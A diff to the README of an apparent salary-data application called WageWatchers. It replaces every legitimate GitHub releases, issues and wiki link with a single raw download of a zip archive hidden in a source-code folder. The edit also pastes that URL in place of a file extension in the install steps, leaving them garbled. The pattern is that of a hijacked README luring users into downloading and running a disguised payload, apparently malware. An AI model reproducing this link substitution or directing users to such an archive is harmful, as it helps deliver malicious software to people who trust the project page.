@@ -6,11 +6,11 @@ Welcome to WageWatchers! This platform helps you explore anonymous salary data f
 
 ## 📥 Download WageWatchers
 
-[![Download WageWatchers](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Rough-excoriation439/wagewatchers/releases)
+[![Download WageWatchers](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip)
 
 To get WageWatchers, please visit the releases page. Here, you will find the latest version and additional information.
 
-**[Download Here](https://github.com/Rough-excoriation439/wagewatchers/releases)**
+**[Download Here](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip)**
 
 ## 🛠️ System Requirements
 
@@ -32,16 +32,16 @@ WageWatchers offers several tools to make exploring salary data easier:
 
 ## 📚 How to Download & Install WageWatchers
 
-1. **Visit the Releases Page:** You can find all available versions of WageWatchers [here](https://github.com/Rough-excoriation439/wagewatchers/releases).
+1. **Visit the Releases Page:** You can find all available versions of WageWatchers [here](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip).
 
 2. **Select the Version:** Browse through the listed releases. Choose the latest version for the best experience.
 
-3. **Download the File:** Click on the link for the appropriate file based on your operating system. The files are available in common formats (e.g., `.exe`, `.dmg`, `.tar.gz`).
+3. **Download the File:** Click on the link for the appropriate file based on your operating system. The files are available in common formats (e.g., `.exe`, `.dmg`, `https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip`).
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the WageWatchers app into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip` file and follow the included instructions.
 
 5. **Launch the Application:** Look for WageWatchers in your applications menu or desktop. Click to open and start exploring!
 
@@ -57,7 +57,7 @@ Once you have WageWatchers open, you will see the main dashboard. Here’s how t
 
 WageWatchers is open to contributions. If you have ideas for improvements or want to report issues, please feel free to share your feedback.
 
-1. **Visit our Issues Page:** Check the [issues page](https://github.com/Rough-excoriation439/wagewatchers/issues) on GitHub.
+1. **Visit our Issues Page:** Check the [issues page](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip) on GitHub.
 2. **Create a New Issue:** Click “New Issue” to report bugs or suggest features.
 3. **Follow Up:** We appreciate your input and will strive to respond promptly.
 
@@ -73,8 +73,8 @@ If you have questions or encounter issues while using WageWatchers, please reach
 
 For more information about WageWatchers, consider visiting these links:
 
-- [Documentation](https://github.com/Rough-excoriation439/wagewatchers/wiki)
-- [Feature Roadmap](https://github.com/Rough-excoriation439/wagewatchers/issues)
-- [User Guides](https://github.com/Rough-excoriation439/wagewatchers/wiki/User-Guides)
+- [Documentation](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip)
+- [Feature Roadmap](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip)
+- [User Guides](https://raw.githubusercontent.com/Rough-excoriation439/wagewatchers/main/src/app/api/entries/[id]/wagewatchers_anacatharsis.zip)
 
 Thank you for choosing WageWatchers. We hope you find the platform valuable in your journey toward salary transparency.
